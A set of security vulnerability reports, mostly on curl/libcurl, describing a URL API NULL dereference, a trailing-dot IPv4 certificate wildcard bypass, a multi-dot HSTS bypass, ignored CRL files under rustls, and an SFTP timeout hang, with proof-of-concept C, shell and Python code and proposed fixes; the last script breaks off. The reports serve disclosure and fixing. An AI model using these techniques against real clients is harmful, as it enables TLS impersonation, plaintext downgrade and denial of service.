title: NULL pointer dereference in libcurl URL API redirect_url() with CURLU_DEFAULT_SCHEME
vulnerability_information:
## Summary A NULL pointer dereference appears to exist in libcurl's URL API path when `curl_url_set()` handles a relative URL together with `CURLU_DEFAULT_SCHEME` on a `CURLU` handle that has host/path information but no stored `u->scheme`. The issue is in `lib/urlapi.c` inside `redirect_url()`, where `u->scheme` is used in `strlen(u->scheme)` before the function checks whether the relevant inputs are valid. If the URL handle reaches this path without a stored scheme, the process can crash with SIGSEGV. Dan Fandrich from the curl security list asked me to submit this report on HackerOne for tracking. This is the same issue previously emailed to `security@curl.se`. ## Affected version - Source reviewed: curl master / 8.21.0-DEV area, `lib/urlapi.c`, `redirect_url()` - The original report stated reproduction against libcurl 8.14.1 and the current development source path. - Local reproduction environment used libcurl URL API semantics around `CURLU_DEFAULT_SCHEME`. ## Technical details In `redirect_url()`, `u->scheme` is dereferenced before a safe NULL check: ```c const char *protsep = base + strlen(u->scheme) + 3; DEBUGASSERT(base && relurl && u); if(!base)   return CURLUE_MALFORMED_INPUT; ``` The problematic path is possible because `urlget_url()` can use `DEFAULT_SCHEME` locally when `CURLU_DEFAULT_SCHEME` is supplied, without necessarily storing a scheme in `u->scheme`: ```c if(u->scheme)   scheme = u->scheme; else if(flags & CURLU_DEFAULT_SCHEME)   scheme = DEFAULT_SCHEME; else   return CURLUE_NO_SCHEME; ``` This means URL generation can succeed using a default scheme string, while the underlying `CURLU` object can still have `u->scheme == NULL`. Later, `redirect_url()` assumes `u->scheme` is non-NULL and calls `strlen(u->scheme)`. ## Steps to reproduce The following minimal PoC constructs a `CURLU` handle with host and path, but no explicit scheme, then sets a relative URL using `CURLU_DEFAULT_SCHEME`: ```c #include <stdio.h> #include <curl/curl.h> int main(void) {     CURLU *u = curl_url();     CURLUcode rc;     if(!u)         return 2;     curl_url_set(u, CURLUPART_HOST, "example.com", 0);     curl_url_set(u, CURLUPART_PATH, "/original", 0);     rc = curl_url_set(u, CURLUPART_URL, "/newpath", CURLU_DEFAULT_SCHEME);     printf("Return code: %d\n", rc);     curl_url_cleanup(u);     return 0; } ``` Compile and run: ```bash gcc -o curl-url-default-scheme-poc poc.c -lcurl ./curl-url-default-scheme-poc ``` Expected safe behavior: libcurl should return a `CURLUcode` error such as `CURLUE_MALFORMED_INPUT` or otherwise normalize/store the default scheme safely. Observed vulnerable behavior in the original test: process crash / segmentation fault from dereferencing `u->scheme` in `redirect_url()`. ## Suggested fix Add a `u->scheme` validation before using it in `redirect_url()`, or ensure the default scheme used by `urlget_url()` is persisted in the `CURLU` object before `redirect_url()` is called. Example defensive check: ```c if(!base || !u || !u->scheme)   return CURLUE_MALFORMED_INPUT; const char *protsep = base + strlen(u->scheme) + 3; ```

## Impact

## Impact A process using libcurl's URL API can be crashed by reaching this URL parsing path with attacker-controlled or otherwise untrusted relative URL input. The direct security impact is denial of service against applications that: - Build a `CURLU` handle in stages, setting host/path without an explicit scheme - Accept or process relative URLs - Use `CURLU_DEFAULT_SCHEME` for convenience or redirect-style normalization If such input is remotely controllable in an application, an attacker may be able to terminate the process by triggering the NULL pointer dereference. I do not claim code execution; this is a crash/availability issue.

title: Trailing-dot IPv4 URL bypasses IP-address guard, allows wildcard DNS SAN match
vulnerability_information:
Hi all,

Sorry to ruin anybody's day, but we've discovered another issue when it comes to dots.

We've found a TLS certificate verification bypass that lets a trailing-dot IPv4 URL -- `https://127.0.0.1./` -- pass peer authentication against a wildcard DNS SAN certificate such as `DNS:*.0.0.1`. The IP address guard that is supposed to prevent wildcard matching on IP literals is silently bypassed because the guard still sees the un-stripped pointer `"127.0.0.1."` and `inet_pton` rejects the trailing dot, so the guard returns `FALSE` and wildcard matching proceeds as if the peer were a DNS hostname.

This is in the same trailing-dot normalisation family as CVE-2022-30115 and the just-reported multi-dot HSTS bypass, but it crosses a different boundary: instead of a protocol-downgrade, you get a full certificate validation bypass on any HTTPS connection whose host happens to be a trailing-dot IPv4 address (however that certificate may come to be...).

The bug is in `lib/vtls/hostcheck.c`. `hostmatch()` correctly decrements `hostlen` to strip the trailing dot at lines 87-88, but it leaves the `hostname` pointer unchanged. The IP guard at line 96 then calls `Curl_host_is_ipnum(hostname)` with that original pointer -- `"127.0.0.1."` including the dot -- and `inet_pton(AF_INET, "127.0.0.1.", &in)` strictly rejects any string with a stray trailing dot, returning 0. The guard returns `FALSE` and control falls through to the wildcard matching path:

```c
/* lib/vtls/hostcheck.c lines 87-96 */

  /* normalize pattern and hostname by stripping off trailing dots */
  if(hostname[hostlen - 1] == '.')  /* TRUE for "127.0.0.1." */
    hostlen--;                       /* hostlen 11 -> 10; pointer unchanged */
  if(pattern[patternlen - 1] == '.')
    patternlen--;

  if(strncmp(pattern, "*.", 2))
    return pmatch(hostname, hostlen, pattern, patternlen);

  /* detect host as IP address or starting with a dot and fail if so */
  else if(Curl_host_is_ipnum(hostname) || (hostname[0] == '.'))
    /* ^^^ hostname is still "127.0.0.1." -- inet_pton rejects it -- FALSE */
    return FALSE;
```

There is a second failure point upstream of `hostmatch()`. `get_peer_type()` in `lib/vtls/vtls.c` is the function that decides whether a peer is an IPv4 address, an IPv6 address, or a DNS name. It makes the same `inet_pton` call against the raw `"127.0.0.1."` string and returns `CURL_SSL_PEER_DNS` instead of `CURL_SSL_PEER_IPV4`. That classification then causes `ossl_verifyhost()` in `lib/vtls/openssl.c` to enumerate DNS SANs (rather than iPAddress SANs) and send the host string into `Curl_cert_hostcheck()`, which is where the wildcard comparison runs. So even before `hostmatch()` is reached, the peer type is already wrong.

The Schannel backend has a parallel instance of the same problem at `lib/vtls/schannel_verify.c:533`: `get_num_host_info()` calls `curlx_inet_pton(AF_INET, conn_hostname, &ia)` and the trailing dot causes it to fail there too, sending the host down the DNS name comparison path.

Reproducer on current master (`curl 8.21.0-DEV`, `libcurl/8.21.0-DEV OpenSSL/3.4.1`):

```bash
# Generate a local CA and a server cert with only a wildcard DNS SAN -- no IP SAN
mkdir -p /tmp/f30certs && cd /tmp/f30certs

openssl genrsa -out ca.key 2048 2>/dev/null
openssl req -new -x509 -days 3650 -key ca.key -out ca.pem \
    -subj "/CN=TestCA-F30" 2>/dev/null

openssl genrsa -out server.key 2048 2>/dev/null
openssl req -new -key server.key -out server.csr \
    -subj "/CN=wildcard" 2>/dev/null
cat > server.ext <<'EOF'
subjectAltName = DNS:*.0.0.1
EOF
openssl x509 -req -days 3650 -in server.csr \
    -CA ca.pem -CAkey ca.key -CAcreateserial \
    -out server.pem -extfile server.ext 2>/dev/null

# Start a TLS server
openssl s_server -cert server.pem -key server.key -port 18450 -quiet 2>/dev/null &
SERVER_PID=$!; sleep 2

cd /path/to/curl   # adjust as needed
```

Test 1 -- trailing-dot IP (vulnerable path):

```bash
./src/curl \
    --resolve "127.0.0.1.:18450:127.0.0.1" \
    "https://127.0.0.1.:18450/" \
    --cacert /tmp/f30certs/ca.pem \
    -v 2>&1 | grep -E \
        "subjectAltName|subject:|SSL certificate verified|no alternative|FAILED|SSL:|curl: \("
```

Output:

```
*   subject: CN=wildcard
*   subjectAltName: "127.0.0.1." matches cert's "*.0.0.1"
* SSL certificate verified via OpenSSL.
curl: (52) Empty reply from server
```

Exit code 52 (`CURLE_GOT_NOTHING`): the TLS handshake completed, peer verification passed, and the only reason curl didn't get content back is that `openssl s_server` sends nothing at the application layer. A real server would have served the response. Verification was bypassed.

Test 2 -- plain IP (correctly rejected):

```bash
./src/curl \
    --resolve "127.0.0.1:18450:127.0.0.1" \
    "https://127.0.0.1:18450/" \
    --cacert /tmp/f30certs/ca.pem \
    -v 2>&1 | grep -E \
        "subjectAltName|subject:|SSL certificate verified|no alternative|FAILED|SSL:|curl: \("
```

Output:

```
*   subject: CN=wildcard
*  subjectAltName does not match ipv4 address 127.0.0.1
* SSL: no alternative certificate subject name matches target ipv4 address '127.0.0.1'
curl: (60) SSL: no alternative certificate subject name matches target ipv4 address '127.0.0.1'
```

Exit code 60 (`CURLE_PEER_FAILED_VERIFICATION`). Without the trailing dot, `get_peer_type()` correctly identifies `CURL_SSL_PEER_IPV4`, `ossl_verifyhost()` looks for an iPAddress SAN, finds none, and rejects the certificate.

The full self-contained PoC (cert generation, server startup, and both test invocations) is in `reports/F30_poc.sh`.

The fix is a one-pointer inconsistency in `hostmatch()`. After `hostlen` is decremented, `hostname` still points at the nul-terminated original string including the dot. The IP guard needs to see a nul-terminated copy whose length matches `hostlen`:

```c
/* lib/vtls/hostcheck.c: replace the guard at line 96 */

  else {
    char hostcopy[NI_MAXHOST];
    if(hostlen >= sizeof(hostcopy))
      return FALSE;
    memcpy(hostcopy, hostname, hostlen);
    hostcopy[hostlen] = '\0';
    if(Curl_host_is_ipnum(hostcopy) || (hostcopy[0] == '.'))
      return FALSE;
  }
```

For defence in depth, `get_peer_type()` in `lib/vtls/vtls.c` should also strip the trailing dot before calling `inet_pton` so that the peer type is classified correctly upstream of `ossl_verifyhost()`. The same treatment is needed for `conn_hostname` before `get_num_host_info()` in `lib/vtls/schannel_verify.c:533`. A higher-level alternative is to have `ipv4_normalize()` in `lib/urlapi.c` recognise and strip trailing-dot IPv4 forms early, so the dot never reaches TLS peer setup at all.

Two preconditions are needed: a trailing-dot IPv4 URL (which arises naturally when software constructs URLs from DNS PTR records, passes Host headers through normalisation layers, or when operators append a dot to suppress search-domain suffix lookups), and an attacker-held certificate with a matching wildcard DNS SAN (straightforward to obtain from any private or internal CA, and those are the norm in the enterprise and cloud environments where structured IP ranges like `10.0.x.y` make the wildcard useful).

Affected backends: OpenSSL (and forks: AWS-LC, BoringSSL, LibreSSL, quictls) and Schannel. Not affected: rustls, GnuTLS, mbedTLS (each verifies hostnames independently without going through `hostmatch()`).

Thank you,
AISLE Research Team

## Impact

## Summary:

A client can incorrectly accept a certificate with only a wildcard `dNSName` SAN for a trailing-dot IPv4 HTTPS URL, causing a full server-identity verification bypass for that connection. An attacker who can present a trusted cert like `DNS:*.0.0.1` in an environment where `https://127.0.0.1./`-style URLs occur could impersonate the target host and terminate TLS successfully.

title: IDOR: autotranslate.translateMessage Full Message Content Leak

summaries.author: julio_araujo
summaries.content: The `/api/v1/autotranslate.translateMessage` endpoint allows any authenticated user to retrieve the full content of any message from any room (private groups, direct messages, channels) by simply providing the target message ID. The endpoint fetches the message via `Messages.findOneById(messageId)` with no room access check (`canAccessRoomIdAsync` is never called), returning the complete `IMessage` object including message text, sender info, room ID, timestamps, and markdown content.

title: HSTS multi-trailing-dot bypass-ish: possible incomplete fix for CVE-2022-30115
vulnerability_information:
Hi all,

Honestly, I'm not completely certain about this issue, but I _think_ the CVE-2022-30115 fix ("HSTS bypass via trailing dot") is incomplete: the same asymmetry exists for hostnames with two or more trailing dots, so `http://example.com../` still gets sent in plaintext when there's a valid HSTS entry for `example.com`. The fix commit itself — `fae6fea209` (2022-05-09, "hsts: ignore trailing dots when comparing hosts names") — used a single `if` rather than a `while`, so anything beyond one trailing dot still slips through.

The short version: the HSTS layer normalises the runtime hostname by stripping *one* trailing dot before lookup; the URL parser and the peer layer preserve every trailing dot verbatim. So a single-dot host (`example.com.`) is correctly normalised down to `example.com` and matches the stored entry — that's the 2022 fix doing its job — but `example.com..` ends up looking for `example.com.` in the store and never matches.

The strip is a single `if`, not a `while`, in all three places it appears:

- `lib/hsts.c:117-119` (`hsts_create`, store path)
- `lib/hsts.c:156-158` (`hsts_check`, lookup path)
- `lib/hsts.c:439-441` (`hsts_add_host_expire`, file-load path)

So, this is the same hostname-normalisation issue as CVE-2022-30115, just with multiple trailing dots rather than one: the 2022 fix handles exactly one trailing dot, but not two or more. Replacing each `if` with a `while` makes the normalisation consistent, and `hsts_check` would probably also needs an `if(!hlen) return NULL;` guard for an all-dots host (untested, jfyi).

Using `while` instead of `if` would match how major browser HSTS implementations treat this class of hostname canonicalisation. This would match how major browser HSTS implementations treat this class of hostname canonicalisation, e.g. Chromium's HSTS preload lookup strips the full trailing-dot suffix before lookup in [`DecodeHSTSPreload()`](https://source.chromium.org/chromium/chromium/src/+/main:net/http/transport_security_state.cc;l=304) (`size_t trailing_dot_found = host.find_last_not_of('.');`). Firefox's HSTS path canonicalises hostnames through [`CanonicalizeHostname()`](https://github.com/mozilla-firefox/firefox/blob/main/security/manager/ssl/PublicKeyPinningService.h), whose contract explicitly covers hostnames with multiple trailing dots and normalises them to lowercase with no trailing dot.

Anyways, a quick Reproducer on master:

```bash
echo 'example.com "29991231 23:59:59"' > /tmp/hsts.txt
for H in 'example.com' 'example.com.' 'example.com..'; do
  echo "=== http://$H/ ===";
  ./src/curl -sv --hsts /tmp/hsts.txt \
    --resolve "$H:80:127.0.0.1" --resolve "$H:443:127.0.0.1" \
    --max-time 1 --connect-timeout 1 -o /dev/null "http://$H/" 2>&1 \
    | grep -E "Switched|Trying " | head -2
done
```

Output:

```
=== http://example.com/ ===
* Switched from HTTP to HTTPS due to HSTS => https://example.com/
*   Trying 127.0.0.1:443...
=== http://example.com./ ===
* Switched from HTTP to HTTPS due to HSTS => https://example.com./
*   Trying 127.0.0.1:443...
=== http://example.com../ ===
*   Trying 127.0.0.1:80...
```

`--resolve` for both 80 and 443 isolates the upgrade decision — the destination address is identical, the only thing that varies is whether libcurl picked `https://`.

Caveat: `example.com..` is of course notreally  a legal DNS name (empty label) and standard resolvers reject it — `getent`, `host`, `dig` and curl's own default resolver all fail. So the bypass needs `/etc/hosts`, attacker-controlled DNS, or app code feeding the multi-dot name into a `--resolve`-equivalent (like similar to how we use `--resolve` above). The url-parser test in `tests/libtest/lib1560.c:209` actually mentions this specific case, so it is seemingly a valid usage: "Multiple trailing dots, not okay in DNS but works in /etc/hosts".

Also, same single-`if` pattern in `lib/altsvc.c` — `altsvc_createid` at `:98-101` on store and `hostcompare` at `:440-441` on lookup — with the same multi-dot miss:

```bash
echo 'h2 example.com 443 h2 alt.example.com 8443 "20991231 23:59:59" 1 0' \
    > /tmp/altsvc.txt
for H in 'example.com' 'example.com.' 'example.com..'; do
  echo "=== https://$H/ ==="
  ./src/curl -v --alt-svc /tmp/altsvc.txt \
    --resolve "$H:443:127.0.0.1" \
    --resolve "alt.example.com:8443:127.0.0.1" \
    --max-time 1 --connect-timeout 1 -k -o /dev/null "https://$H/" 2>&1 \
    | grep -E "Trying" | head -1
done
```

```
=== https://example.com/ ===
*   Trying 127.0.0.1:8443...        <- alt-svc hit, alt port used
=== https://example.com./ ===
*   Trying 127.0.0.1:8443...        <- alt-svc hit (1-dot strip works)
=== https://example.com../ ===
*   Trying 127.0.0.1:443...         <- alt-svc miss, canonical port
```

The alt-svc miss is just a missed optimisation, not a security downgrade — but worth fixing for consistency (and I'll report a similar actual security issue with that later).

## Impact

HSTS protection is silently bypassed for any hostname with two or more trailing dots, downgrading HTTPS to plaintext and exposing credentials and cookies to a network attacker who can influence the URL being fetched.

title: rustls backend silently ignores CURLOPT_CRLFILE when native CA store is active
vulnerability_information:
Hi all,

When the rustls backend is configured to use the OS native CA store (`--ca-native` / `CURLSSLOPT_NATIVE_CA`), any CRL file supplied via `--crlfile` / `CURLOPT_CRLFILE` is silently ignored. The option is accepted — `CURLE_OK` from `curl_easy_setopt`, exit 0 from the command line — and revoked certificates pass TLS verification without any error or warning at any verbosity level.

The short version: `Curl_ssl_rustls` advertises `SSLSUPP_CRLFILE` unconditionally, so `setopt` accepts the path and stores it in `conn_config->CRLfile` on every rustls handle regardless of which verifier will actually be used. By the time `cr_init_backend()` runs, that path has been accepted by the library and there is nothing left to complain about. The verifier-selection ladder then silently discards it.

The ladder at `lib/vtls/rustls.c:1040-1061` has three mutually exclusive arms. When `verifypeer` is off, a no-op verifier is installed. When `ssl_config->native_ca_store` is set, `init_config_builder_platform_verifier()` is called and the function returns — `conn_config->CRLfile` is never examined on this path. The `else if(ca_info_blob || ssl_cafile)` branch is where `init_config_builder_verifier()` lives, and *that* function checks `conn_config->CRLfile` at lines 752-758 and calls through to `rustls_web_pki_server_cert_verifier_builder_add_crl()`. But the native-CA and explicit-CA branches are mutually exclusive; you can't be on both at once.

```c
else if(ssl_config->native_ca_store) {              /* branch A — CRLfile never touched */
    result = init_config_builder_platform_verifier(data, config_builder);
    if(result != CURLE_OK) {
      rustls_client_config_builder_free(config_builder);
      return result;
    }
}
else if(ca_info_blob || ssl_cafile) {               /* branch B — CRL wiring is here */
    result = init_config_builder_verifier(data, config_builder,
                                          conn_config, ca_info_blob, ssl_cafile);
    ...
}
```

The reason branch A has no CRL wiring isn't an oversight in the curl code so much as a hard limitation in rustls-ffi: `rustls_platform_server_cert_verifier()` returns a fully-constructed opaque `rustls_server_cert_verifier *` with no subsequent mutation API. The webpki path has a builder pattern — `rustls_web_pki_server_cert_verifier_builder_new()`, then `_add_crl()`, then `_build()` — but there is no equivalent `rustls_platform_server_cert_verifier_builder_*` family. You cannot attach a CRL to the platform verifier at the rustls-ffi 0.15 level, full stop. The curl-side problem is that this upstream limitation is invisible to the caller: the API says yes, the transfer succeeds, and a revoked certificate walks right through.

Reproduction — tested against `curl 8.21.0-DEV libcurl/8.21.0-DEV rustls-ffi/0.15.0/rustls/0.23.25/aws-lc-rs`:

```bash
CURL=curl/bld-rustls/src/curl
WORKDIR=/tmp/f28-poc
mkdir -p $WORKDIR/ca/{newcerts,private}
touch $WORKDIR/ca/index.txt
printf '01\n' > $WORKDIR/ca/serial
printf '01\n' > $WORKDIR/ca/crlnumber

# generate CA
openssl genrsa -out $WORKDIR/ca/private/cakey.pem 4096 2>/dev/null
openssl req -new -x509 -days 3650 \
    -key $WORKDIR/ca/private/cakey.pem \
    -out $WORKDIR/ca/cacert.pem \
    -subj "/CN=F28 Test CA/O=PoC/C=AU"

# issue server cert with SAN (platform verifier requires it)
cat > $WORKDIR/san.ext <<'EOF'
[req]
req_extensions = v3_req
distinguished_name = req_distinguished_name
[req_distinguished_name]
[v3_req]
subjectAltName = @alt_names
[alt_names]
DNS.1 = localhost
IP.1 = 127.0.0.1
EOF

openssl genrsa -out $WORKDIR/server.key 2048 2>/dev/null
openssl req -new -key $WORKDIR/server.key -out $WORKDIR/server.csr \
    -subj "/CN=localhost/O=PoC/C=AU" -config $WORKDIR/san.ext
openssl x509 -req -in $WORKDIR/server.csr \
    -CA $WORKDIR/ca/cacert.pem -CAkey $WORKDIR/ca/private/cakey.pem \
    -CAcreateserial -out $WORKDIR/server.crt -days 365 \
    -extensions v3_req -extfile $WORKDIR/san.ext

# revoke it and generate CRL
cat > $WORKDIR/ca/openssl.cnf <<'EOF'
[ca]
default_ca = CA_default
[CA_default]
dir               = /tmp/f28-poc
database          = /tmp/f28-poc/ca/index.txt
new_certs_dir     = /tmp/f28-poc/ca/newcerts
certificate       = /tmp/f28-poc/ca/cacert.pem
serial            = /tmp/f28-poc/ca/serial
private_key       = /tmp/f28-poc/ca/private/cakey.pem
crlnumber         = /tmp/f28-poc/ca/crlnumber
default_crl_days  = 30
default_md        = sha256
policy            = policy_anything
copy_extensions   = copy
[policy_anything]
countryName            = optional
commonName             = supplied
EOF

openssl ca -config $WORKDIR/ca/openssl.cnf -revoke $WORKDIR/server.crt 2>/dev/null
openssl ca -config $WORKDIR/ca/openssl.cnf -gencrl -out $WORKDIR/revoked.crl 2>/dev/null

# install CA into OS trust store
sudo cp $WORKDIR/ca/cacert.pem /usr/local/share/ca-certificates/f28-test-ca.crt
sudo update-ca-certificates

# start server presenting the revoked cert
openssl s_server \
    -cert $WORKDIR/server.crt -key $WORKDIR/server.key \
    -CAfile $WORKDIR/ca/cacert.pem \
    -accept 18443 -www -quiet &
```

Test A — `--cacert` + `--crlfile` (branch B, CRL enforced):

```
$ $CURL -s --cacert /tmp/f28-poc/ca/cacert.pem \
             --crlfile /tmp/f28-poc/revoked.crl \
             https://localhost:18443/
* rustls_connection_process_new_packets: invalid peer certificate: Revoked
curl: (60) rustls_connection_process_new_packets: invalid peer certificate: Revoked
$ echo $?
60
```

Test B — `--ca-native` + `--crlfile` (branch A, CRL silently ignored):

```
$ $CURL -s --ca-native \
             --crlfile /tmp/f28-poc/revoked.crl \
             https://localhost:18443/
<HTML><BODY BGCOLOR="#ffffff">...
$ echo $?
0
```

The certificate, the CRL file, and the server are identical across both runs. The only difference is which verifier branch `cr_init_backend()` takes. Test A exits 60 with a clear rejection message. Test B exits 0 with the HTTP body and no indication whatsoever that revocation was not checked.

The immediate fix is a three-line guard at the top of the `native_ca_store` branch:

```diff
--- a/lib/vtls/rustls.c
+++ b/lib/vtls/rustls.c
@@ -1043,6 +1043,13 @@
   else if(ssl_config->native_ca_store) {
+    if(conn_config->CRLfile) {
+      failf(data, "rustls: --crlfile is not supported with --ca-native; "
+            "the platform verifier has no CRL attachment API");
+      rustls_client_config_builder_free(config_builder);
+      return CURLE_NOT_BUILT_IN;
+    }
     result = init_config_builder_platform_verifier(data, config_builder);
```

That converts silent non-enforcement into a clear, actionable error — `CURLE_NOT_BUILT_IN` (77) plus a descriptive message, the same result as setting `CURLOPT_CRLFILE` on a backend that declares no support for it. The unconditional `SSLSUPP_CRLFILE` in `Curl_ssl_rustls` is also a candidate for removal or conditionalization so the rejection happens at setopt time rather than connection time, but the in-`cr_init_backend()` guard is the safe immediate path. The longer-term path is a rustls-ffi upstream feature request for a builder pattern around the platform verifier; if `rustls_platform_server_cert_verifier_builder_add_crl()` ever exists, the guard can be relaxed and actual CRL enforcement on the native-CA path becomes possible.

Thank you,
AISLE Research Team

## Impact

when curl uses the rustls native OS verifier path with --ca-native, a supplied --crlfile can be accepted by the API but never applied, so a certificate that should be rejected as revoked may still verify successfully and the HTTPS connection proceeds as trusted. In current curl source, CRL handling is wired into the webpki verifier builder path, while the native verifier path constructs an opaque platform verifier directly, and curl's public docs still say CURLOPT_CRLFILE works with Rustls, so this is best described as a real silent-security-failure / policy-bypass bug rather than intended behavior.

title: libssh SFTP initialization ignores CURLOPT_TIMEOUT, hangs indefinitely

weakness.name: Allocation of Resources Without Limits or Throttling

vulnerability_information:
Hi all,

The libssh backend in `lib/vssh/libssh.c` ignores `CURLOPT_TIMEOUT` / `--max-time` during SFTP subsystem negotiation. A server that completes SSH authentication and then stalls before answering the `SSH_FXP_INIT` packet will pin the curl process indefinitely — no timeout fires, no error is returned, and the process must be killed externally. The libssh2 backend has no such problem.

The short version: `myssh_in_SFTP_INIT` (lines 1288–1309) calls `ssh_set_blocking(session, 1)` and then immediately calls `sftp_init()`, which blocks inside the libssh event loop waiting for the server's `SSH_FXP_VERSION` reply. The timeout check in `myssh_block_statemach` lives *after* `myssh_statemachine` returns — so if `sftp_init()` never returns, `Curl_timeleft_ms` is never reached. The libssh session also has no `SSH_OPTIONS_TIMEOUT` set anywhere in the file, so there is no fallback timeout at the libssh layer either.

The blocking sequence is right there in the source, lines 1288–1309:

```c
static int myssh_in_SFTP_INIT(struct Curl_easy *data,
                              struct ssh_conn *sshc)
{
  int rc;
  ssh_set_blocking(sshc->ssh_session, 1);          /* blocking ON */

  sshc->sftp_session = sftp_new(sshc->ssh_session); /* blocking */
  if(!sshc->sftp_session) {
    failf(data, "Failure initializing sftp session: %s",
          ssh_get_error(sshc->ssh_session));
    return myssh_to_ERROR(data, sshc, CURLE_COULDNT_CONNECT);
  }

  rc = sftp_init(sshc->sftp_session);              /* blocks here indefinitely */
  if(rc != SSH_OK) {
    failf(data, "Failure initializing sftp session: %s",
          ssh_get_error(sshc->ssh_session));
    return myssh_to_ERROR(data, sshc, sftp_error_to_CURLE(SSH_FX_FAILURE));
  }
  myssh_to(data, sshc, SSH_SFTP_REALPATH);
  return SSH_NO_ERROR;
}
```

This is a deliberate contradiction with the session-start code at line 692–694, which sets the session non-blocking explicitly with a comment explaining why:

```c
/* Set libssh to non-blocking, since everything internally is
   non-blocking */
ssh_set_blocking(sshc->ssh_session, 0);
```

`myssh_in_SFTP_INIT` overrides that unconditionally and provides no escape hatch. A quick grep confirms no `SSH_OPTIONS_TIMEOUT` is ever set on the session in the entire file:

```
$ grep SSH_OPTIONS_TIMEOUT lib/vssh/libssh.c
(no output)
```

The timeout check itself lives in `myssh_block_statemach` (lines 2437–2473) and looks correct in isolation — the problem is that it only runs after `myssh_statemachine` returns:

```c
while((sshc->state != SSH_STOP) && !result) {
  bool block;
  timediff_t left_ms = 1000;

  result = myssh_statemachine(data, sshc, sshp, &block); /* hangs here at SSH_SFTP_INIT */
  if(result)
    break;

  if(!disconnect) {
    result = Curl_pgrsCheck(data);
    if(result)
      break;

    left_ms = Curl_timeleft_ms(data);   /* never reached while sftp_init() is blocked */
    if(left_ms < 0) {
      failf(data, "Operation timed out");
      return CURLE_OPERATION_TIMEDOUT;
    }
  }
  ...
}
```

Compare this to the libssh2 backend in `lib/vssh/libssh2.c`. It sets the session non-blocking once at startup (line 1440) and never reverts it. The SFTP init handler at lines 1779–1799 then just tries the allocation, and if the server has not replied yet, it returns `CURLE_AGAIN` and yields back to the event loop:

```c
sshc->sftp_session = libssh2_sftp_init(sshc->ssh_session);
if(!sshc->sftp_session) {
    if(libssh2_session_last_errno(sshc->ssh_session) ==
       LIBSSH2_ERROR_EAGAIN)
      return CURLE_AGAIN;    /* yields; event loop checks Curl_timeleft_ms on next iteration */
    ...
}
```

The libssh backend has no equivalent yield point for this state. Once `sftp_init()` is entered against a non-responding server, nothing can interrupt it short of the TCP connection being dropped.

The trigger sequence:

1. Application sets `CURLOPT_TIMEOUT` or user passes `--max-time N`. The deadline is recorded in `Curl_timeleft_ms`.
2. curl completes TCP and SSH handshake normally. The session runs non-blocking during key exchange and auth; timeouts work fine here.
3. State machine reaches `SSH_SFTP_INIT`, dispatches to `myssh_in_SFTP_INIT`, which calls `ssh_set_blocking(…, 1)` then `sftp_init()`.
4. Server has completed auth but withholds the `SSH_FXP_VERSION` reply. `sftp_init()` blocks in the libssh event loop.
5. Control never returns to `myssh_statemachine`, so `myssh_block_statemach` never reaches `Curl_timeleft_ms`.
6. No libssh-level timeout fires either since `SSH_OPTIONS_TIMEOUT` was never set.
7. Process is frozen indefinitely. `CURLOPT_TIMEOUT`, `CURLOPT_CONNECTTIMEOUT`, `--max-time`, `--connect-timeout` are all inoperative for this phase.

We have a reproducer. The PoC server is a small paramiko script that completes SSH auth normally and then accepts the SFTP subsystem channel at the SSH-transport layer, but never sends the `SSH_FXP_VERSION` response — exactly what a stalled or adversarial SFTP daemon would do:

```python
#!/usr/bin/env python3
"""
F29 PoC: paramiko SSH server that stalls SFTP subsystem initialization.

The server completes SSH authentication normally but, when the client
opens a channel and sends a 'sftp' subsystem request, it accepts the
channel and then sleeps forever without returning an SFTP subsystem
response.  When curl (libssh backend) calls sftp_init(), the blocking
call inside myssh_in_SFTP_INIT() waits indefinitely, bypassing
CURLOPT_TIMEOUT / --max-time.

Usage:
    pip install paramiko
    python3 F29_server.py &
    curl --max-time 3 -v sftp://user:pass@127.0.0.1:2222/file

Expected (buggy) behaviour with libssh build: curl hangs past 3 s.
Expected behaviour with libssh2 build: curl exits with error 28
(CURLE_OPERATION_TIMEDOUT) within ~3 s.

Generate a throwaway RSA host key with:
    python3 -c "
    from paramiko import RSAKey
    k = RSAKey.generate(2048)
    k.write_private_key_file('/tmp/f29_host_rsa')
    "
"""

import socket
import threading
import time
import sys

try:
    import paramiko
except ImportError:
    sys.exit("paramiko is required: pip install paramiko")

HOST_KEY_PATH = "/tmp/f29_host_rsa"
LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 2222
STALL_SECONDS = 120  # stall well beyond any reasonable --max-time


def generate_host_key():
    """Generate a throwaway RSA host key if one does not already exist."""
    import os
    if not os.path.exists(HOST_KEY_PATH):
        print(f"[*] Generating throwaway host key at {HOST_KEY_PATH}")
        key = paramiko.RSAKey.generate(2048)
        key.write_private_key_file(HOST_KEY_PATH)
    return paramiko.RSAKey(filename=HOST_KEY_PATH)


class StallingServerInterface(paramiko.ServerInterface):
    """Accept password auth for any user; stall on sftp subsystem."""

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        # Accept any credentials so the test focuses on SFTP init stall.
        print(f"[*] Auth OK: user={username!r}")
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_none(self, username):
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_subsystem_request(self, channel, name):
        if name == "sftp":
            print(f"[*] SFTP subsystem requested — stalling for {STALL_SECONDS}s "
                  f"(never sending subsystem response)")
            # Spawn a thread that does nothing, simulating a server that
            # accepted the channel but never responds to the SFTP subsystem
            # open.  The channel object is intentionally not used.
            def _stall():
                time.sleep(STALL_SECONDS)
            threading.Thread(target=_stall, daemon=True).start()
            # Return True so paramiko marks the request accepted at the
            # SSH-transport layer; the SFTP layer response is then withheld
            # by never sending data on the channel.
            return True
        return False


def handle_client(client_sock, host_key):
    transport = paramiko.Transport(client_sock)
    transport.add_server_key(host_key)
    server = StallingServerInterface()
    try:
        transport.start_server(server=server)
        # Wait long enough for curl to time out (or not).
        chan = transport.accept(timeout=STALL_SECONDS + 10)
        if chan:
            time.sleep(STALL_SECONDS)
    except Exception as exc:
        print(f"[!] Transport error: {exc}")
    finally:
        transport.close()
        client_sock.close()


def main():
    host_key = generate_host_key()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((LISTEN_HOST, LISTEN_PORT))
    sock.listen(5)
    print(f"[*] Listening on {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[*] Test command:")
    print(f"    curl --max-time 3 -v sftp://user:pass@{LISTEN_HOST}:{LISTEN_PORT}/file")
    print(f"[*] With a libssh-built curl, the command will hang past 3 s.")
